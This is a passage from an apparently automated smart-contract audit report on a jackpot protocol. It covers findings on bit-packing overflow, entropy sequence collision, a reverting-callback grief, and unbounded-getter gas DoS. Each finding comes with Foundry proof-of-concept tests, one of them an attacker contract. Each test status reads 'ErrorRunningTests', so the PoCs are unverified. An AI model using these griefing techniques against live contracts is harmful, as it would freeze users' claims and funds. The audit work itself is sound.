        uint256 bonusballMatch = (ticketBonusball == winningBonusball) ? 1 : 0;
        // identical structure to Jackpot._calculateTicketTierId
        return 2 * (matches - bonusballMatch) + bonusballMatch; // underflows if matches==0 and bonusballMatch==1
    }

    function popcount(uint256 x) internal pure returns (uint256 c) {
        while (x != 0) {
            c += (x & 1);
            x >>= 1;
        }
    }
}

contract BitpackOverflowTest is Test {
    function test_BonusballBitOverflow_ZeroesBit_LeadsToUnderflow() public {
        CalcHarness h = new CalcHarness();
        uint256 normalMax = 128;
        uint256 bonusball = 128; // normalMax + bonusball = 256 -> shift overflow in 256-bit vector

        // Demonstrate that the packed bonusball bit overflows to zero when shifting by >= 256
        uint256 overflowed = (uint256(1) << (normalMax + bonusball));
        assertEq(overflowed, 0, "bit should overflow to zero when shifting by >= 256");

        // Build packed normals with 0 normal matches
        uint256 winning = (1 << 1) | (1 << 2) | (1 << 3) | (1 << 4) | (1 << 5);
        uint256 ticket  = (1 << 6) | (1 << 7) | (1 << 8) | (1 << 9) | (1 << 10);

        // No bonusball bit present on either side due to overflow => both high parts are 0 => equals => bonusballMatch = 1
        // With 0 normal matches, (0 - 1) underflows and must revert.
        vm.expectRevert();
        h.calc(ticket, winning, normalMax);
    }
}


## Suggested Mitigation
Enforce the bit-packing bound at all configuration and derivation points, and reject packing that would exceed uint256 width:
- In admin setters:
  • setNormalBallMax: require(uint16(_normalBallMax) + uint16(bonusballMin) <= 255, "bit-pack overflow");
  • setBonusballMin: require(uint16(normalBallMax) + uint16(_bonusballMin) <= 255, "bit-pack overflow");
- In _setNewDrawingState after computing newBonusball, clamp to safe range:
  • uint8 maxBonus = uint8(255 - normalBallMax);
  • uint8 candidate = uint8(Math.max(bonusballMin, Math.ceilDiv(minNumberTickets, combosPerBonusball)));
  • newDrawingState.bonusballMax = candidate > maxBonus ? maxBonus : candidate; // or revert if candidate > maxBonus to avoid silent truncation.
- In TicketComboTracker.insert, before shifting, validate packing space:
  • require(uint256(_bonusball) + uint256(_tracker.normalMax) <= 255, "bonusball bit overflows");
This fully prevents the invalid state that leads to bonusball bit loss and subsequent mis-tiering/DoS. Avoid modifying _calculateTicketTierId to mask the issue; enforcing the packing invariant is the correct fix.





 **Derived From** : drawingState[currentDrawingId].ballMax + drawingState[currentDrawingId].bonusballMax <= 255

## [M-17]. Bonusball bit overflows uint256 packing (1 << (bonus+normalMax) == 0) causing claimWinnings DoS and misclassification

### Finding Severity Justification: Impact is high (claims can revert and tiers be misclassified, leading to stuck funds and incorrect payouts), but exploitation requires an owner-set configuration where bonusballMax + normalBallMax exceeds the uint256 packing boundary. Under normal economics the LP pool cap logic prevents overflow; however, the absence of a guard in setBonusballMin and _setNewDrawingState allows a plausible admin parameter update (raising bonusballMin) to brick claims for a drawing. Per Code4rena rubric, this is a vulnerability reachable under reasonable privileged use and is therefore capped at Medium.
## Derived From Pattern/Invariant
drawingState[currentDrawingId].ballMax + drawingState[currentDrawingId].bonusballMax <= 255

## Exploit Type
IntegerMath

## Location
Jackpot._setNewDrawingState

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
Jackpot bit-packs the bonusball at bit index (normalMax + bonusball). Neither _setNewDrawingState nor buyTickets enforce normalMax + bonusballMax <= 255. When this sum exceeds 255, TicketComboTracker.insert uses 1 << (bonusball + normalMax) which evaluates to 0, erasing the bonusball bit in packed tickets and in the stored winningTicket. Downstream effects: (1) Ticket decoding via TicketComboTracker.unpackTicket computes bonusball = uint8(LibBit.fls(_packedTicket) - _normalMax) and can underflow/revert for most tickets; (2) Tier computation in Jackpot._calculateTicketTierId shifts by (_normalBallMax + 1) and compares ticketBonusball == winningBonusball; with overflow both are 0, so bonusballMatch == 1 while popCount over normals doesn’t include the bonusball bit. For many tickets (e.g., 0 matching normals), this makes (matches - bonusballMatch) underflow and claimWinnings reverts, bricking claims. For tickets with >=1 normal match, tiers are misclassified (e.g., 1-normal+bonus tier id 3 collapses to tier id 1), leading to incorrect payouts and potential insolvency if more claims occur than the tier’s computed winner count. Vulnerable flow: _setNewDrawingState computes newDrawingState.bonusballMax without bounding; TicketComboTracker.insert/unpackTicket and Jackpot._calculateTicketTierId assume the bound holds.

## Impact
When normalBallMax + bonusballMax >= 256, the bonusball bit overflows out of the 256-bit ticket word. This leads to: (a) claimWinnings DoS for tickets whose normal matches are 0 but whose bonusball equals the overflowing value (bonusballMatch spuriously evaluates true because both shifted values are 0, causing (matches - bonusballMatch) underflow and revert), (b) tier misclassification for other tickets because the bonusball comparison is wrong while matches excludes the missing bonusball bit, resulting in incorrect payouts and potentially insolvency if winner counts per tier are miscomputed, and (c) read-path breakage: getUnpackedTicket / getExtendedTicketInfo can revert or return corrupted data for such tickets because TicketComboTracker.unpackTicket assumes a valid bonusball bit above normalMax.

## Command to Run Test


## Proof of Concept
1) Owner configures normalBallMax = 128 and sets bonusballMin = 200 (so 128 + 200 >= 256). 2) Initialize and fund LP, then initialize the jackpot so the next drawing adopts bonusballMax = 200. 3) A user buys a ticket with normals [1,2,3,4,5] and bonusball 200. The packed bonusball bit overflows to 0. 4) Owner locks the drawing and settles it with winning normals disjoint from the ticket and winning bonusball also 200 (so the winning bonusball bit also overflows to 0). 5) On claimWinnings, _calculateTicketTierId computes matches == 0 (no normal overlap) and bonusballMatch == 1 (both shifted values are 0, hence equal). The expression (matches - bonusballMatch) underflows and reverts, DoS'ing the claim.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {Jackpot} from "contracts/Jackpot.sol";
import {JackpotLPManager} from "contracts/JackpotLPManager.sol";
import {JackpotTicketNFT} from "contracts/JackpotTicketNFT.sol";
import {GuaranteedMinimumPayoutCalculator} from "contracts/GuaranteedMinimumPayoutCalculator.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockUSDC is IERC20 {
    string public name = "MockUSDC"; string public symbol = "USDC"; uint8 public decimals = 6;
    uint256 private _total;
    mapping(address=>uint256) public override balanceOf;
    mapping(address=>mapping(address=>uint256)) public override allowance;
    function totalSupply() external view override returns (uint256){return _total;}
    function transfer(address to, uint256 amt) external override returns (bool){balanceOf[msg.sender]-=amt;balanceOf[to]+=amt;emit Transfer(msg.sender,to,amt);return true;}
    function approve(address s, uint256 amt) external override returns (bool){allowance[msg.sender][s]=amt;emit Approval(msg.sender,s,amt);return true;}
    function transferFrom(address f,address t,uint256 a) external override returns (bool){uint256 al=allowance[f][msg.sender];require(al>=a, "allow");allowance[f][msg.sender]=al-a;balanceOf[f]-=a;balanceOf[t]+=a;emit Transfer(f,t,a);return true;}
    function mint(address to, uint256 amt) external {balanceOf[to]+=amt;_total+=amt;emit Transfer(address(0),to,amt);}    
}

contract MockEntropy is IScaledEntropyProvider {
    function requestAndCallbackScaledRandomness(uint32, SetRequest[] memory, bytes4, bytes memory) external payable returns (uint64){return 0;}
    function getFee(uint32) external view returns (uint256){return 0;}
}

contract BonusballOverflowDoSTest is Test {
    Jackpot jackpot;
    JackpotLPManager lp;
    JackpotTicketNFT nft;
    GuaranteedMinimumPayoutCalculator payout;
    MockUSDC usdc;
    MockEntropy entropy;

    function setUp() public {
        // Deploy core
        jackpot = new Jackpot({
            _drawingDurationInSeconds: 1 days,
            _normalBallMax: 128,
            _bonusballMin: 10,
            _lpEdgeTarget: 25e16,
            _reserveRatio: 1e17,
            _referralFee: 0,
            _referralWinShare: 0,
            _protocolFee: 0,
            _protocolFeeThreshold: 0,
            _ticketPrice: 1e6,
            _maxReferrers: 3,
            _entropyBaseGasLimit: 300000
        });
        lp = new JackpotLPManager(IJackpot(address(jackpot)));
        nft = new JackpotTicketNFT(IJackpot(address(jackpot)));
        usdc = new MockUSDC();
        entropy = new MockEntropy();

        // Payout calc
        bool[12] memory minTiers;
        for (uint i=0;i<12;i++){minTiers[i]=true;}
        uint256[12] memory w;
        for (uint i=0;i<12;i++){w[i]=1e18/12;} w[11] += (1e18 - (w[0]+w[1]+w[2]+w[3]+w[4]+w[5]+w[6]+w[7]+w[8]+w[9]+w[10]));
        payout = new GuaranteedMinimumPayoutCalculator(IJackpot(address(jackpot)), 0, 0, minTiers, w);

        // Wire deps
        jackpot.initialize(IERC20(address(usdc)), IJackpotLPManager(address(lp)), IJackpotTicketNFT(address(nft)), IScaledEntropyProvider(address(entropy)), payout);

        // Init LP deposits via Jackpot API
        jackpot.initializeLPDeposits(1_000_000_000e6);

        // Seed LP
        usdc.mint(address(this), 1_000_000e6);
        usdc.approve(address(jackpot), type(uint256).max);
        jackpot.lpDeposit(100_000e6);

        // Force dangerous bonusball range via admin param so new drawing adopts it
        jackpot.setBonusballMin(200); // 128 + 200 >= 256 -> overflow

        // Start first drawing
        jackpot.initializeJackpot(block.timestamp + 1);
    }

    function test_DoS_on_claim_due_to_bonusball_bit_overflow() public {
        // Buy a ticket in drawing 1 with overflowing bonusball index
        IJackpot.Ticket[] memory t = new IJackpot.Ticket[](1);
        uint8[] memory normals = new uint8[](5);
        normals[0]=1; normals[1]=2; normals[2]=3; normals[3]=4; normals[4]=5;
        t[0] = IJackpot.Ticket({normals: normals, bonusball: 200});
        uint256[] memory ids = jackpot.buyTickets(t, address(this), new address[](0), new uint256[](0), bytes32(0));

        // Lock and settle drawing 1: choose disjoint normals and the same overflowing bonusball = 200
        jackpot.lockJackpot();
        uint256[][] memory wins = new uint256[][](2);
        wins[0] = new uint256[](5); wins[0][0]=10; wins[0][1]=11; wins[0][2]=12; wins[0][3]=13; wins[0][4]=14; // no overlap
        wins[1] = new uint256[](1); wins[1][0]=200; // overflowing bonusball
        vm.prank(address(entropy));
        jackpot.scaledEntropyCallback(bytes32(0), wins, "");

        // Claim should revert: matches == 0, bonusballMatch spuriously true (both overflowed), (0 - 1) underflows
        uint256[] memory claimIds = new uint256[](1); claimIds[0]=ids[0];
        vm.expectRevert();
        jackpot.claimWinnings(claimIds);
    }
}


## Suggested Mitigation
Add strict packing guards and a defensive tier calculation: (1) Enforce the invariant normalBallMax + bonusballMax <= 255 at all points configuration can change. Concretely: in setBonusballMin add require(_bonusballMin <= 255 - normalBallMax); in setNormalBallMax add require(_normalBallMax <= 128) to satisfy Combinations.choose and require(_bonusballMin <= 255 - _normalBallMax); (2) In _setNewDrawingState, after computing newBonusball, clamp and/or revert: uint8 maxBB = uint8(255 - normalBallMax); if (newBonusball > maxBB) revert InvalidBonusballMin(); else newDrawingState.bonusballMax = newBonusball; (3) Optionally add a runtime assertion before accepting tickets or before initializing the tracker: require(_currentDrawingState.ballMax + _currentDrawingState.bonusballMax <= 255, "Bit-pack overflow"); (4) Harden _calculateTicketTierId against false bonusball matches caused by overflow by ensuring that a match is only counted if either value has a non-zero bonusball bit: compute uint256 tb = _ticketNumbers >> (_normalBallMax + 1); uint256 wb = _winningNumbers >> (_normalBallMax + 1); bool bbMatch = (tb != 0 && wb != 0 && tb == wb); then apply the subtraction using bbMatch. This removes spurious matches even if a misconfiguration slipped through.





 **Derived From** : Pending requests keyed only by sequence collide across providers, misrouting randomness/DoS

## [M-18]. Provider-scoped sequence collision in ScaledEntropyProvider.entropyCallback misroutes randomness and causes UnknownSequence DoS after provider rotation

### Finding Severity Justification: Using only the sequence number to index pending requests allows cross-provider sequence collisions after an admin rotates the provider. This can misroute entropy callbacks and subsequently revert with UnknownSequence, causing a functional DoS of jackpot settlement. No direct funds are stolen, but protocol availability and critical workflow (drawing settlement) are impacted.
## Derived From Pattern/Invariant
Pending requests keyed only by sequence collide across providers, misrouting randomness/DoS

## Exploit Type
AccountingInvariantViolation

## Location
ScaledEntropyProvider.entropyCallback

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
IEntropyV2 sequences are scoped per provider, but ScaledEntropyProvider stores pending requests keyed only by sequence and ignores the provider in the callback. Vulnerable code: mapping(uint64 => PendingRequest) private pending; and function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override { PendingRequest memory req = pending[sequence]; if (req.callback == address(0)) revert UnknownSequence(); delete pending[sequence]; ... req.callback.call(...); }. When owner rotates the provider mid-flight, the new provider may reuse the same sequence number, overwriting an existing pending entry. The next callback from the old provider will use the overwritten pending entry and send randomness to the wrong consumer; when the new provider later calls back, pending no longer exists and the function reverts UnknownSequence. This breaks the invariant that requests are uniquely identified and delivered to the correct consumer and can brick jackpot settlement or other downstream consumers relying on the callback.

## Impact
Randomness integrity and availability are compromised upon provider rotation. Because pending requests are keyed only by sequence (which is scoped per provider in Pyth), rotating to a new provider can reuse the same sequence and overwrite an existing pending entry. This leads to misdelivery of randomness to a different consumer and subsequent UnknownSequence reverts for the intended request. In protocols like Jackpot, this can block settlement (functional DoS) and cause callbacks to be executed on unintended contracts with incorrect context. No direct theft occurs, but critical workflows and fairness guarantees are impacted until manual recovery.

## Command to Run Test


## Proof of Concept
1) Consumer A requests randomness while provider=P1; pending[s] is stored under sequence s.
2) Owner calls setEntropyProvider(P2) before P1 fulfills.
3) Consumer B requests randomness; P2 assigns the same provider-scoped sequence s, overwriting pending[s].
4) Entropy callback for (P1, s) arrives; contract looks up pending[s] (now B's), deletes it, and calls B's callback with P1's randomness, misrouting it.
5) Later callback for (P2, s) arrives; pending[s] no longer exists -> UnknownSequence revert, causing DoS for B's request and bricking downstream flows.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {ScaledEntropyProvider} from "contracts/ScaledEntropyProvider.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";

// Minimal interface to call the consumer's external _entropyCallback without importing external packages
interface IEntropyCB {
    function _entropyCallback(uint64 sequence, address provider, bytes32 randomNumber) external;
}

// Mock Pyth Entropy that assigns sequence numbers per provider
contract MockEntropy {
    mapping(address => uint64) public nextSeq;

    function getFeeV2(address /*provider*/, uint32 /*gasLimit*/) external pure returns (uint128) {
        return 0; // simplify: zero fee
    }

    function requestV2(address provider, uint32 /*gasLimit*/) external payable returns (uint64) {
        uint64 s = nextSeq[provider];
        if (s == 0) s = 1; // start from 1 per provider
        nextSeq[provider] = s + 1;
        return s;
    }

    function fulfill(address consumer, uint64 sequence, address provider, bytes32 rn) external {
        IEntropyCB(consumer)._entropyCallback(sequence, provider, rn);
    }
}

contract Receiver {
    ScaledEntropyProvider public sep;
    bool public called;
    uint64 public lastSeq;
    bytes public lastCtx;

    constructor(address _sep) {
        sep = ScaledEntropyProvider(_sep);
    }

    function request(IScaledEntropyProvider.SetRequest[] memory reqs, uint32 gasLimit, bytes memory ctx) external returns (uint64 seq) {
        seq = sep.requestAndCallbackScaledRandomness(gasLimit, reqs, this.handleRandomness.selector, ctx);
    }

    function handleRandomness(uint64 sequence, uint256[][] memory /*numbers*/, bytes memory context) external {
        require(msg.sender == address(sep), "only sep");
        called = true;
        lastSeq = sequence;
        lastCtx = context;
    }
}

contract ProviderSequenceCollisionTest is Test {
    MockEntropy entropy;
    ScaledEntropyProvider sep;
    Receiver A;
    Receiver B;

    address P1 = address(0xAAA1);
    address P2 = address(0xAAA2);

    function setUp() public {
        entropy = new MockEntropy();
        sep = new ScaledEntropyProvider(address(entropy), P1);
        A = new Receiver(address(sep));
        B = new Receiver(address(sep));
    }

    function _mkReq() internal pure returns (IScaledEntropyProvider.SetRequest[] memory r) {
        r = new IScaledEntropyProvider.SetRequest[](1);
        r[0] = IScaledEntropyProvider.SetRequest({
            samples: 1,
            minRange: 1,
            maxRange: 10,
            withReplacement: false
        });
    }

    function test_providerScopedSequenceCollision_misroutes_and_DOS() public {
        // 1) A requests using provider P1 → sequence s = 1 (scoped to P1)
        uint64 sA = A.request(_mkReq(), 200_000, bytes("A"));
        assertEq(sA, 1);

        // 2) Rotate provider to P2 (test contract is owner)
        sep.setEntropyProvider(P2);

        // 3) B requests using provider P2 → sequence s = 1 (scoped to P2), overwriting pending[1]
        uint64 sB = B.request(_mkReq(), 200_000, bytes("B"));
        assertEq(sB, 1);

        // Preconditions
        assertFalse(A.called, "A should not be called yet");
        assertFalse(B.called, "B should not be called yet");

        // 4) Fulfill (P1, 1) first → sep ignores provider and uses pending[1] (now B's),
        // deletes it and calls B instead of A (misdelivery)
        entropy.fulfill(address(sep), 1, P1, bytes32(uint256(123)));
        assertTrue(B.called, "B should have been called with P1's randomness");
        assertEq(B.lastSeq, 1);
        assertFalse(A.called, "A never received its callback (misdelivered)");

        // 5) Later fulfill (P2, 1) → pending[1] already deleted, expect UnknownSequence revert (DoS)
        vm.expectRevert(ScaledEntropyProvider.UnknownSequence.selector);
        entropy.fulfill(address(sep), 1, P2, bytes32(uint256(456)));
    }
}


## Suggested Mitigation
Scope pending requests by provider and validate provider in the callback to prevent cross-provider sequence collisions. Concrete options:
- Primary fix: Change storage to mapping(address => mapping(uint64 => PendingRequest)) pending; Store to pending[currentProvider][sequence] where currentProvider is the provider used at request time. In entropyCallback, use the provided provider argument to look up and delete pending[provider][sequence], and revert if it does not exist. This removes cross-provider collisions and ensures correct routing even across rotations.
- Operational guard (optional, defense-in-depth): Disallow setEntropyProvider() when there are any pending requests (e.g., maintain a pending counter) or implement a providerEpoch and key pending by (epoch, sequence). This prevents mid-flight rotations from creating ambiguous state.
- Additionally, remove the comment and logic that ignores the provider parameter in entropyCallback; actively compare the provider argument against the pending entry to ensure integrity.





 **Derived From** : Untrusted callback can revert and permanently wedge entropy requests

## [L-19]. ScaledEntropyProvider.entropyCallback is griefable: external callback revert bricks fulfillment and strands pending request

### Finding Severity Justification: A failing downstream callback causes the provider’s entropyCallback to revert, which rolls back deletion of the pending entry and leaves it stranded forever. Impact is limited to request-level DoS (the requester loses their fee and never receives the callback) and storage bloat in ScaledEntropyProvider. It does not endanger funds or globally DoS the protocol, since other sequences and future requests are unaffected. This aligns with a QA/Low availability issue rather than asset risk.
## Derived From Pattern/Invariant
Untrusted callback can revert and permanently wedge entropy requests

## Exploit Type
Dos

## Location
ScaledEntropyProvider.entropyCallback

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
ScaledEntropyProvider forwards randomness to an arbitrary callback recorded at request time (msg.sender) and reverts the entire callback if the external call fails. Because the deletion of pending[sequence] happens before the external call, the revert undoes that deletion and the pending entry remains forever with no admin cancel path. Any untrusted requester can register a callback that reverts (or OOGs within the available gas), causing Pyth’s callback into entropyCallback to revert every time, permanently wedging that request and leaving storage bloat. Vulnerable snippet:

function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override {
    PendingRequest memory req = pending[sequence];
    if (req.callback == address(0)) revert UnknownSequence();
    delete pending[sequence];

    uint256[][] memory scaledRandomNumbers = _getScaledRandomness(randomNumber, req.setRequests);
    (bool success, ) = req.callback.call(
        abi.encodeWithSelector(req.selector, sequence, scaledRandomNumbers, req.context)
    );
    if (!success) revert CallbackFailed(req.selector);
    ...
}

## Impact
Permanent DoS for the affected request (never fulfilled); persistent storage bloat due to stranded PendingRequest; fee paid by requester is stranded; repeatable to create many stuck entries increasing storage.

## Command to Run Test


## Proof of Concept
1) Attacker deploys a small contract whose callback reverts (or uses too much gas). 2) Attacker calls requestAndCallbackScaledRandomness from that contract, passing its reverting function selector; fee can be minimal if the provider returns 0 for testing. 3) When the entropy provider (Pyth) later calls ScaledEntropyProvider._entropyCallback, ScaledEntropyProvider.entropyCallback pre-deletes pending[seq], builds the scaled numbers, then calls the attacker’s callback which reverts; ScaledEntropyProvider.entropyCallback reverts with CallbackFailed, undoing the delete. 4) The pending entry remains forever; there is no retry or admin cancel path. Attacker can repeat for many sequences to bloat storage.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../contracts/ScaledEntropyProvider.sol";
import "../contracts/interfaces/IScaledEntropyProvider.sol";
import "../contracts/external/@pythnetwork/entropy-sdk-solidity/IEntropyV2.sol";
import "../contracts/external/@pythnetwork/entropy-sdk-solidity/EntropyStructsV2.sol";

contract FakeEntropy is IEntropyV2 {
    uint64 public seq;

    // Minimal payables/stubs to satisfy interface
    function requestV2() external payable returns (uint64) { return ++seq; }
    function requestV2(uint32) external payable returns (uint64) { return ++seq; }
    function requestV2(address, uint32) external payable returns (uint64) { return ++seq; }
    function requestV2(address, bytes32, uint32) external payable returns (uint64) { return ++seq; }

    function getProviderInfoV2(address) external view returns (EntropyStructsV2.ProviderInfo memory info) {}
    function getDefaultProvider() external view returns (address) { return address(this); }
    function getRequestV2(address, uint64) external view returns (EntropyStructsV2.Request memory req) {}
    function getFeeV2() external view returns (uint128) { return 0; }
    function getFeeV2(uint32) external view returns (uint128) { return 0; }
    function getFeeV2(address, uint32) external view returns (uint128) { return 0; }

    // Helper: simulate Pyth delivering entropy
    function fulfill(ScaledEntropyProvider consumer, uint64 sequence, bytes32 rand) external {
        consumer._entropyCallback(sequence, address(this), rand);
    }
}

contract RevertingCallback {
    function attack(ScaledEntropyProvider provider) external returns (uint64 seq) {
        IScaledEntropyProvider.SetRequest[] memory reqs = new IScaledEntropyProvider.SetRequest[](1);
        reqs[0] = IScaledEntropyProvider.SetRequest({samples: 1, minRange: 1, maxRange: 2, withReplacement: true});
        bytes memory ctx = hex"01";
        seq = provider.requestAndCallbackScaledRandomness(200000, reqs, this.onRand.selector, ctx);
    }

    function onRand(uint64, uint256[][] memory, bytes memory) external {
        revert("callback revert");
    }
}

contract GriefableCallbacksTest is Test {
    ScaledEntropyProvider provider;
    FakeEntropy fake;
    RevertingCallback attacker;

    function setUp() public {
        fake = new FakeEntropy();
        provider = new ScaledEntropyProvider(address(fake), address(0xBEEF));
        attacker = new RevertingCallback();
    }

    function test_AttackerRevertPinsPendingRequest() public {
        // Attacker originates the request from their contract so callback == attacker
        uint64 seq = attacker.attack(provider);

        // Entropy delivers; expect revert from provider due to CallbackFailed
        vm.expectRevert();
        fake.fulfill(provider, seq, keccak256("seed"));

        // Pending entry remains (delete was reverted), proving griefable DoS
        ScaledEntropyProvider.PendingRequest memory req = provider.getPendingRequest(seq);
        assertEq(req.callback, address(attacker));
    }
}


## Suggested Mitigation
- Do not revert the entire entropyCallback when the downstream callback fails. Wrap the external call in try/catch or low-level call and mark the request as delivered regardless of downstream failure. For example:

(bool success, ) = req.callback.call(...);
// Always keep deletion of pending entry
if (!success) {
    emit CallbackFailed(req.selector);
    // Optionally store a minimal failure status to allow off-chain retry/diagnostics
    return; // do not revert
}

- Alternatively, provide an owner-only or requester-only cancel/force-complete path to clear stuck pending[sequence].
- Consider capping the size of _context and setRequests length to limit storage griefing.





 **Derived From** : Unbounded iteration in getUserTickets may cause gas-based DoS for on-chain callers

## [L-20]. Unbounded loop and array allocation in JackpotBridgeManager.getUserTickets enables gas-DoS of on-chain integrations

### Finding Severity Justification: The issue is confined to an external view helper that allocates memory and iterates based on an ever-growing counter. While an attacker can grief a target by mass-purchasing tickets to inflate totalTicketsOwned and cause getUserTickets() to run out of gas for on-chain callers, the impact is limited to this getter and does not affect core jackpot operations or solvency. Moreover, the attack requires spending real USDC, making it a paid grief. Such unbounded view getters are typically intended for off-chain use; on-chain integrations should avoid them or use pagination.
## Derived From Pattern/Invariant
Unbounded iteration in getUserTickets may cause gas-based DoS for on-chain callers

## Exploit Type
GasGriefBlockLimit

## Location
JackpotBridgeManager.getUserTickets(address,uint256)

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
JackpotBridgeManager.getUserTickets allocates an array sized to userTickets[_user][_drawingId].totalTicketsOwned and iterates from 0..totalTicketsOwned:

function getUserTickets(address _user, uint256 _drawingId) external view returns (uint256[] memory) {
    UserTickets storage userDrawingTickets = userTickets[_user][_drawingId];
    uint256[] memory ticketIds = new uint256[](userDrawingTickets.totalTicketsOwned);
    for (uint256 i = 0; i < userDrawingTickets.totalTicketsOwned; i++) {
        uint256 ticketId = userDrawingTickets.ticketIds[i];
        if (ticketOwner[ticketId] == _user) {
            ticketIds[i] = ticketId;
        }
    }
    return ticketIds;
}

The totalTicketsOwned counter is append-only and never decreased on claims or transfers, so it can be inflated without bound. Any on-chain contract calling this view risks out-of-gas due to unbounded iteration and memory allocation. Attackers can mass-purchase tickets via buyTickets with _recipient set to a target address (permissionlessly), causing future on-chain calls to getUserTickets(target, drawingId) to revert. Because totalTicketsOwned is not compacted when tickets are burned/transferred, the DoS persists and may return arrays filled mostly with zeros.

## Impact
On-chain integrations that call getUserTickets can be permanently griefed to revert due to memory allocation and loop gas costs exceeding block or call gas limits, breaking functionality (e.g., routers, dashboards, or other contracts using this view).

## Command to Run Test


## Proof of Concept
1) Attacker repeatedly calls JackpotBridgeManager.buyTickets with _recipient = victim and the current drawing, inflating userTickets[victim][drawingId].totalTicketsOwned.
2) totalTicketsOwned grows without bound; it is never reduced on claim or transfer.
3) Any on-chain contract later calling getUserTickets(victim, drawingId) attempts to allocate a massive array and loop over all indices, running out of gas and reverting.
4) Even if the victim claims/transfers tickets, totalTicketsOwned stays large, so the DoS persists for that drawing.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {JackpotBridgeManager} from "contracts/JackpotBridgeManager.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";
import {IJackpotTicketNFT} from "contracts/interfaces/IJackpotTicketNFT.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract BridgeHarness is JackpotBridgeManager {
    constructor() JackpotBridgeManager(
        IJackpot(address(0x1)),
        IJackpotTicketNFT(address(0x2)),
        IERC20(address(0x3)),
        "BridgeManager",
        "1"
    ) {}

    // Seed an arbitrarily large total without doing expensive mints.
    function seedTotal(address user, uint256 drawingId, uint256 total) external {
        UserTickets storage ut = userTickets[user][drawingId];
        ut.totalTicketsOwned = total;
        // Optionally set a few entries so filtering executes the if-branch
        for (uint256 i = 0; i < 3; i++) {
            ut.ticketIds[i] = i + 1;
            ticketOwner[i + 1] = user;
        }
    }
}

contract GetUserTicketsGasDosTest is Test {
    BridgeHarness mgr;

    function setUp() public {
        mgr = new BridgeHarness();
    }

    function test_getUserTickets_gas_dos() public {
        address victim = address(0xBEEF);
        uint256 drawingId = 1;

        // Inflate the append-only counter so the view allocates/loops massively.
        mgr.seedTotal(victim, drawingId, 1_000_000); // 1e6 entries => huge memory allocation

        // Simulate an on-chain integration with limited gas calling the view.
        (bool ok, ) = address(mgr).call{gas: 300_000}(
            abi.encodeWithSelector(mgr.getUserTickets.selector, victim, drawingId)
        );
        assertEq(ok, false, "getUserTickets should run out of gas and revert");

        // Show that with a small count the same call pattern succeeds under generous gas.
        mgr.seedTotal(victim, drawingId, 10);
        (ok, ) = address(mgr).call{gas: 3_000_000}(
            abi.encodeWithSelector(mgr.getUserTickets.selector, victim, drawingId)
        );
        assertEq(ok, true, "getUserTickets should succeed with small totals and enough gas");
    }
}


## Suggested Mitigation
Avoid unbounded allocation/iteration: (1) add pagination (offset, limit) and return only a bounded slice; (2) maintain a compact, up-to-date list of currently owned ticket IDs with an index mapping so removals on claim/transfer reduce the count; (3) expose a count function and a paged getter, and deprecate the unbounded getter. Example: function getUserTicketsPaged(address user, uint256 drawingId, uint256 offset, uint256 limit) external view returns (uint256[] memory).





 **Derived From** : All returned ticketIds correspond to existing NFTs currently owned by the user via BridgeManager custody (IERC721.ownerOf(ticketId) succeeds and equals address(this), and tickets are not burned)

## [L-21]. Stale ticketOwner mapping makes getUserTickets return burned tickets, causing signature-based claims to revert (cross-chain payout DoS)

### Finding Severity Justification: The issue is a state/bookkeeping inconsistency: JackpotBridgeManager does not clear its ticketOwner mapping (nor prune its per-drawing list) after tickets are burned during a successful claim via Jackpot. As a result, getUserTickets can surface burned ticketIds. This can cause keeper-built batches to revert when passed to Jackpot.claimWinnings, impacting liveness/UX but not protocol solvency or user funds. Users can still claim by submitting only valid, unburned ticketIds; no assets are at risk. Hence impact is availability/operational, not financial.
## Derived From Pattern/Invariant
All returned ticketIds correspond to existing NFTs currently owned by the user via BridgeManager custody (IERC721.ownerOf(ticketId) succeeds and equals address(this), and tickets are not burned)

## Exploit Type
EventConsistency

## Location
JackpotBridgeManager.getUserTickets

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
JackpotBridgeManager.getUserTickets builds its return array by scanning userTickets[_user][_drawingId].ticketIds and filtering only by ticketOwner[ticketId] == _user. It does not verify token existence or ERC721 ownership. When claimWinnings is executed, Jackpot burns the NFTs but JackpotBridgeManager never clears ticketOwner[ticketId] nor the per-drawing ticket list. As a result, getUserTickets can return burned ticketIds (or zero entries) despite its docstring: "Only returns tickets currently owned by the user (not transferred)." Downstream keepers that rely on getUserTickets to construct the EIP-712 payload for JackpotBridgeManager.claimWinnings will include burned IDs and obtain a valid user signature. _validateTicketOwnership() passes (it only checks the stale ticketOwner mapping), but the internal call to Jackpot.claimWinnings reverts at ownerOf(ticketId) != msg.sender because the NFT no longer exists or isn't owned by the bridge. This permanently DoSes the signature-based cross-chain payout flow for those users unless the off-chain keeper implements extra filtering. Vulnerable snippet:

function getUserTickets(address _user, uint256 _drawingId) external view returns (uint256[] memory) {
    UserTickets storage userDrawingTickets = userTickets[_user][_drawingId];
    uint256[] memory ticketIds = new uint256[](userDrawingTickets.totalTicketsOwned);
